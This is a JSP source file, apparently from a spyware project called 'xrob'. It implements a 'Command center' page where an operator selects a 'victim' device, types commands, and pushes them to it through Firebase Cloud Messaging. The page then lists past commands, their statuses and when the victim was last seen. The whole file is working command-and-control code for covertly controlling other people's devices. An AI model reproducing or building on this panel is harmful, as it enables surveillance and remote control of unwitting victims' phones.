<%@ page import="com.theah64.xrob.api.models.Delivery" %>
<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.models.Command" %>
<%@ page import="com.theah64.xrob.api.database.tables.*" %>
<%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
<%@ page import="com.theah64.xrob.api.database.tables.command.Commands" %>
<%@ page import="com.theah64.xrob.api.database.tables.command.CommandStatuses" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Command center</title>
    <%@include file="../../common_headers.jsp" %>
    <%
        final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tCommands", "command_row");
    %>
    <script>
        $(document).ready(function () {

            <%=searchTemplate.getSearchScript()%>

        });


    </script>
</head>
<body>
<div class="container">

    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
            final String victimCode = pathInfoUtils.getPart(1);
            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null && theVictim.getFCMId() != null) {

                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(null, theVictim.getId());

    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/client/panel">Victims</a></li>
            <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
            </a></li>
            <li class="active">Command center</li>
        </ul>
    </div>

    <div class="row">

        <div class="row">
            <div class="col-md-8 content-centered">
                <form action="/client/victim/command_center/<%=victimCode%>" method="POST" role="form">
                    <div class="input-group">
                        <input name="command" type="text"
                               pattern="<%=Command.REGEX_VALID_COMMAND%>"
                               id="iCommand"
                               class="form-control"
                               placeholder="Type your command here" required/>
                    <span class="input-group-btn">
                        <input name="isCommandFormSubmitted" type="submit" value="Execute" class="btn btn-primary"/>
                    </span>
                    </div>
                    <div class="help-block">Format: <b>xrob (command_key) '(command_value)'</b>
                    </div>

                    <%
                        final boolean isCommandFormSubmitted = request.getParameter("isCommandFormSubmitted") != null;
                        if (isCommandFormSubmitted) {
                            final String command = request.getParameter(Commands.COLUMN_COMMAND);
                            try {
                                if (command.matches(Command.REGEX_VALID_COMMAND)) {

                                    final Command commandOb = new Command(null, command, 0, null, theVictim.getId(), clientId.toString());
                                    final String commandId = Commands.getInstance().addv3(commandOb);
                                    if (commandId != null) {
                                        commandOb.setId(commandId);

                                        final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), commandOb));
                                        if (isCommandSent) {


                                            final boolean isStatusAdded = CommandStatuses.getInstance().add(
                                                    new Command.Status(
                                                            Command.Status.STATUS_SENT,
                                                            "Command sent",
                                                            0,//now
                                                            System.currentTimeMillis(),//now
                                                            commandId));

                                            if (isStatusAdded) {
                    %>
                    <p class="text-success strong">Command executed
                    </p>
                    <%
                                    } else {
                                        throw new Exception("Command status failed to add");
                                    }
                                } else {
                                    //TODO: Update command table
                                    throw new Exception("Failed to send the command : " + command);
                                }
                            } else {
                                throw new Exception("Failed to save command : " + command);
                            }

                        } else {
                            throw new Exception("Invalid command :" + command);
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    %>
                    <p class="text-danger"><%=e.getMessage()%>
                    </p>
                    <%
                            }
                        }
                    %>


                </form>
            </div>
        </div>

        <div class="row" style="margin-top: 20px;">

            <%
                final List<Command> commands = Commands.getInstance().getAll(clientId.toString(), theVictim.getId());
                if (commands != null) {
            %>
            <div class="col-md-10 content-centered">

                <%=searchTemplate.getTopTemplate(
                        theVictim.getIdentity(),
                        lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>

                <table id="tCommands" class="table table-bordered table-condensed">
                    <tr>
                        <th>Command</th>
                        <th>Status</th>
                        <th>Established</th>
                    </tr>

                    <%
                        for (final Command command : commands) {
                    %>
                    <tr class="command_row">
                        <td><textarea class="form-control"><%=command.getCommand()%></textarea>
                        </td>
                        <td style="text-align: left">
                            <%
                                if (!command.getStatuses().isEmpty()) {
                                    for (int i = command.getStatuses().size() - 1; i >= 0; i--) {
                                        final Command.Status status = command.getStatuses().get(i);
                            %>
                            <span class="label <%=status.getBootstrapLabelClassForStatus()%>"><%=status.getStatus() + " " + status.getRelativeCommandHappenedTime()%></span>
                            <small>
                                (
                                <b><%=status.getStatusMessage() + "</b>- reported " + status.getRelativeCommandReportTime()%>)
                            </small>
                            <br>
                            <%
                                }
                            } else {
                            %>
                            <span class="label label-info">NO STATUS</span>
                            <br>
                            <%
                                }

                            %>
                        </td>
                        <td><%=command.getRelativeEstablishedTime()%>
                        </td>
                    </tr>
                    <%
                        }
                    %>

                </table>
            </div>
            <%
                } else {
                    throw new PathInfo.PathInfoException("No command found!");
                }
            %>

        </div>

        <%

            } else {

                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>
    <%
        } else {
            throw new PathInfo.PathInfoException("Invalid victim code");
        }
    } catch (PathInfo.PathInfoException e) {
        e.printStackTrace();
    %>
    <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
    <%
        }
    %>

</div>
</body>
</html>
